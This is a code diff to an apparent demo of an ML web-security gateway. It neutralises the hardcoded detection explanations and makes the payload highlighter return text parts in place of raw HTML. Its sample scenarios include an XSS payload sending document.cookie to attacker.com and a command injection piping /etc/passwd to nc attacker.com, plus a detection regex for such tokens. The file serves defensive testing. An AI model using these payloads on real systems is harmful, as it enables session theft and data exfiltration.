@@ -126,7 +126,7 @@ export const ATTACK_SCENARIOS = [
       password: 'any_random_password',
     },
     explanation:
-      'The AI Gateway ML Classifier detects SQL tokens (OR, --, single quotes) with 98.4% confidence and marks Anomaly Score = 0.89 (Threshold 0.28). Redis immediately issues a 1-hour IP block.',
+      'The payload contains a SQL tautology and comment marker. Inspect the gateway verdict for the actual classification and response.',
     cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
   },
   {
@@ -142,7 +142,7 @@ export const ATTACK_SCENARIOS = [
       comment: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Great laptop!",
     },
     explanation:
-      'Hybrid CNN+BiLSTM Attention layer highlights the <script> and document.cookie vector. Blocked before persistent storage in the database.',
+      'The payload contains script markup and a cookie-access pattern. Inspect the gateway verdict for the actual classification and response.',
     cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
   },
   {
@@ -155,7 +155,7 @@ export const ATTACK_SCENARIOS = [
     description: 'Attempts to break out of webroot and read sensitive Linux shadow passwords.',
     payload: '',
     explanation:
-      'The feature extractor detects repeated directory traversal sequences (../) with elevated special character density. Autoencoder reconstruction error hits 0.94.',
+      'The path contains repeated parent-directory sequences. Inspect the gateway verdict for the actual classification and response.',
     cwe: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
   },
   {
@@ -170,7 +170,7 @@ export const ATTACK_SCENARIOS = [
       host: '127.0.0.1; cat /etc/passwd | nc attacker.com 4444',
     },
     explanation:
-      'Chained shell operators (;, |) and system binaries trigger immediate CRITICAL risk scoring. Gateway halts upstream transmission.',
+      'The payload contains shell chaining operators and command tokens. Inspect the gateway verdict for the actual classification and response.',
     cwe: 'CWE-78: Improper Neutralization of Special Elements in an OS Command',
   },
   {
@@ -186,7 +186,7 @@ export const ATTACK_SCENARIOS = [
       password: 'password2024!',
     },
     explanation:
-      'Sliding window rate-limiter in Redis tracks 35 requests within 2 seconds. Gateway activates 429 Too Many Requests and flags IP for automated mitigation.',
+      'Repeated authentication attempts exercise the configured rate-limiting policy. Inspect the gateway response for the applied action.',
     cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
   },
   {
@@ -199,7 +199,7 @@ export const ATTACK_SCENARIOS = [
     description: 'Legitimate customer viewing electronics catalog and searching items.',
     payload: '',
     explanation:
-      'Autoencoder reconstruction error = 0.04 (well below 0.28 threshold). ML engine returns ALLOW with 0.998 Normal probability. Forwarded to victim backend in 3.4ms.',
+      'This benign browsing request provides a comparison scenario. Inspect the gateway verdict for its actual scores and response.',
     cwe: 'Benign Traffic (Clean baseline)',
   },
 ];
@@ -210,22 +210,34 @@ export const ATTACK_SCENARIOS = [
 export function highlightAttackPayload(raw: string): {
   hasSuspiciousTokens: boolean;
   tokens: string[];
-  annotatedHtml: string;
+  parts: { text: string; suspicious: boolean }[];
 } {
-  if (!raw) return { hasSuspiciousTokens: false, tokens: [], annotatedHtml: '' };
+  if (!raw) return { hasSuspiciousTokens: false, tokens: [], parts: [] };
 
   const attackRegex =
     /(\b(UNION|SELECT|FROM|WHERE|INSERT|DELETE|UPDATE|DROP|ALTER|OR|AND|EXEC|BENCHMARK|SLEEP)\b|--|\bOR\b\s+['"]?1['"]?\s*=\s*['"]?1|<script.*?>|<\/script>|javascript:|onerror\s*=|onload\s*=|document\.cookie|\.\.\/|\.\.\\|;\s*cat\b|;\s*whoami\b|\|\s*nc\b)/gi;
 
   const foundTokens: string[] = [];
-  const annotated = raw.replace(attackRegex, (match) => {
-    foundTokens.push(match);
-    return `<mark class="threat-token-highlight">${match}</mark>`;
-  });
+  const parts: { text: string; suspicious: boolean }[] = [];
+  let previousIndex = 0;
+  let match: RegExpExecArray | null;
+
+  while ((match = attackRegex.exec(raw)) !== null) {
+    if (match.index > previousIndex) {
+      parts.push({ text: raw.slice(previousIndex, match.index), suspicious: false });
+    }
+    foundTokens.push(match[0]);
+    parts.push({ text: match[0], suspicious: true });
+    previousIndex = match.index + match[0].length;
+  }
+
+  if (previousIndex < raw.length) {
+    parts.push({ text: raw.slice(previousIndex), suspicious: false });
+  }
 
   return {
     hasSuspiciousTokens: foundTokens.length > 0,
     tokens: Array.from(new Set(foundTokens)),
-    annotatedHtml: annotated,
+    parts,
   };
 }
